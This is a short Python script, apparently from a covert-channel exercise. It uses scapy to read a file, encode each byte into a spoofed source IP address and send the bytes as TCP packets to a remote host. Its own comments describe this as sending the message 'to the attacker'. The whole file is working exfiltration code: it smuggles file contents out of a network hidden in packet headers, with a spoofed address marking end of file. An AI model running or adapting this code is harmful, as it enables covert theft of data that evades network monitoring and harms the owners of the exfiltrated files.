##This gets the message and decodes it to binary
##then it sends that bianry meessage to the attacker

from time import sleep
from scapy.all import *
from piggybackEncodeDecodeIP import *
conf.promisc = False


def activeStorage(ip_addr, port, filepath):
    spoffed_ip = "138.47.50.50"
    EOF = "69.69.69.69"
    port = port
    ip_host = ip_addr


    covertBin = []
    with open(filepath, "rb") as f:
        covert = f.read()
    for line in covert:
        covertBin.append(bin(line)[2:].zfill(8))




    for j in range (len(covertBin)):
        srcip= encodeIP(spoffed_ip, covertBin[j], j)
        packet=(IP(dst= ip_host, src= srcip)/TCP(sport = port))
        sentpacket= sr1(packet,retry = 0, timeout = 1)


    pac=(IP(dst=ip_host, src= EOF)/TCP(sport = port))
    sent = sr1(pac,retry = 0, timeout = 1)
